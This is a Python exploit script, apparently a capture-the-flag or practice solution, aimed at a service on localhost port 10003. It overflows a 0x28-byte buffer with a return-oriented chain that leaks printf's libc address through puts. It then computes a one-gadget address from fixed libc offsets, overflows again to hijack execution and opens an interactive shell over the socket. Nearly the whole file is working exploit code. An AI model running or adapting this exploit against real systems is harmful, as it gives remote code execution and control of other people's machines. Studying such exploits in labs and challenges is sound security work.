import socket
import time
import os
import struct
import telnetlib

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<Q', x)

def u(x):
    return struct.unpack('<Q', x)[0]

def interact(s):
    print('----- interactive code ------')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

s = connect('localhost',10003)

time.sleep(1)
print(s.recv(1000))
s.sendall(
    b'a'*0x28 +
    p(0x400873) + #pop rdi
    p(0x601020) + #printf
    p(0x4005d0) + #puts
    p(0x400782) + #main
    b'\n')

time.sleep(1)
d = s.recv(1000)
print(d)
printf = u(d.split(b'\n')[1].ljust(8,b'\0'))
print('printf: %x'%printf)

rce = (printf
    - 0x64e80  # printf
    + 0x4f2c5) # One-gadget RCE 

s.sendall(
    b'a'*0x28 +
    p(rce) +
    b'\n')

interact(s)



















